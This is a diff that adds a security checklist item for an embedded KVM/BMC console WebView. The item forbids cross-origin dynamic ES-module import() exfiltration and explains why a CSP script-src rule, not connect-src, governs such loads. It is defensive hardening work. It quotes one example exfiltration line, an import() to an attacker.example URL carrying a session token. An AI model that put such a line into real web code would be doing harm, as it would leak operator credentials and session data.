@@ -2161,6 +2161,48 @@ flag stays off for that target.
       playback of console DOM): those govern other output, storage or
       capability surfaces, not speech synthesis of privileged console data.
       Verified per target before the flag is flipped.
+* [ ] **No dynamic `import()` / cross-origin ES-module import exfiltration** —
+      the embedded WebView must not let attacker-influenced console content use
+      the ES-module dynamic `import()` operator to load a cross-origin ES module
+      whose URL carries privileged management-session data (KVM frame handles,
+      session tokens, operator credentials, managed-host inventory): no
+      `import('https://attacker.example/mod.js?token=...')`, no dynamic import of
+      a `blob:` / `data:` module assembled from console DOM, and no module-graph
+      `import` chain that pulls a non-approved origin into the trusted frame.
+      A dynamic module load is a main-thread script-loading channel governed by
+      CSP `script-src` (not `connect-src`, which confines fetch / XHR /
+      WebSocket / sendBeacon, and not `worker-src`, which confines Worker /
+      SharedWorker script loads), so a `connect-src 'self'` egress allowlist
+      alone does not confine it. Console content is served by the BMC and is
+      therefore attacker-influenced: a compromised/spoofed BMC or injected
+      script must never turn the trusted frame into a cross-origin ES-module
+      loading exfiltration channel. Every cross-origin dynamic module import
+      from console content must be denied at the WebView (module loads pinned to
+      the approved same-origin HTTPS console via `script-src`, requests denied
+      at interception) on every target, in strict mode and with the flag both
+      off and on. Verified per target.
+      This is a hard, configuration-independent invariant that a future WebView
+      consumer can consult
+      (`KvmWebViewPolicy.bypassDynamicModuleImportExfiltration`, always `false`):
+      the opt-in never bypasses dynamic module import exfiltration — console
+      content can never dynamically import a cross-origin ES module carrying
+      privileged session data, in strict mode and with the flag both off and
+      on. The opt-in relaxes ONLY the test BMC's untrusted server leaf for the
+      expected host, via a scoped per-connection verifier; it must never grant a
+      dynamic module import just to make a console render or to debug it.
+      Operator/app-initiated loads of the console's own approved-origin modules
+      are a separate functional path and stay unaffected. This box governs the
+      main-thread dynamic ES-module loading channel and is distinct from
+      worker-script exfiltration (`bypassWorkerScriptExfiltration`) (an
+      off-main-thread Worker / `importScripts` load governed by `worker-src`),
+      from HTML-driven `<script src>` markup subresource beacons
+      (`bypassHtmlSubresourceExfiltration`) (a document-element script source),
+      from CSS-driven subresource exfiltration (`bypassCssExfiltration`) and
+      from programmatic outbound egress (`bypassOutboundEgressAllowlist`)
+      (fetch / XHR / WebSocket / sendBeacon governed by `connect-src`, not
+      module loads): those govern other script, markup or request surfaces, not
+      dynamic ES-module imports. Verified per target before the flag is
+      flipped.
 * [ ] **Flag-off fallback** — with the opt-in flag off, the external secure
       browser + copy path still works unchanged and no in-app render occurs.
 
